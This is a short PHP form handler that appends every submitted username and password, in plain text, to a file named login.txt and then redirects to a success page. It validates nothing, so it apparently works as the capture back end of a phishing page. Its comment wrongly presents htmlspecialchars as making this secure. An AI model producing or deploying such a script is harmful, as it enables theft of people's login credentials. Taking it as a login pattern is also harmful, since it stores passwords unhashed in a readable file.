<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Sanitize input to prevent security issues
    $username = htmlspecialchars($username);
    $password = htmlspecialchars($password);

    // Open the file login.txt and append the login details
    $file = fopen("login.txt", "a");
    if ($file) {
        fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
        fclose($file);
    } else {
        echo "Error opening file!";
    }

    // Redirect to a success page or back to the form
    header("Location: success.html");
    exit();
}
?>